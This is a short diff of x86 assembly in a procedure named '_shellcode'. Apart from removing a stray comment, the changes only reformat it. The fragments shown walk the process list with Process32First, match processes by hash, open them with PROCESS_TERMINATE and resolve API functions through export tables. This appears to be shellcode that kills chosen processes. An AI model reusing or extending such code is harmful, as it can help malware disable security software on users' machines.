@@ -92,8 +92,6 @@ valid_handle:
   lea eax, [ebp - 138h]
   mov dword ptr [ebp - 138h], 128h
 
-  ; 98: 01 00 0
-
   ; Prepare for call Process32First 
   push eax
   push esi
@@ -162,6 +160,7 @@ continue_process_loop:
   ; ExitProcess(0)
   push 0
   call edi 
+
 hash_process_match:
   ; Prepare for call OpenProcess(PROCESS_TERMINATE, FALSE, __pe32.th32ProcessID)
   push dword ptr [ebp - 130h]
@@ -273,17 +272,17 @@ find_function_ret_fail:
   ret
 
 find_funciton_ret_succcess:
-mov eax, dword ptr [ebp - 0ch]
-mov ecx, dword ptr [ebp - 10h]
-movzx eax, word ptr [eax + esi * 2]
-mov eax, dword ptr [ecx + eax * 4]
-add eax, edi
-pop edi
-pop esi
-pop ebx
-mov esp, ebp
-pop ebp
-ret
+  mov eax, dword ptr [ebp - 0ch]
+  mov ecx, dword ptr [ebp - 10h]
+  movzx eax, word ptr [eax + esi * 2]
+  mov eax, dword ptr [ecx + eax * 4]
+  add eax, edi
+  pop edi
+  pop esi
+  pop ebx
+  mov esp, ebp
+  pop ebp
+  ret
 
 _shellcode endp
 
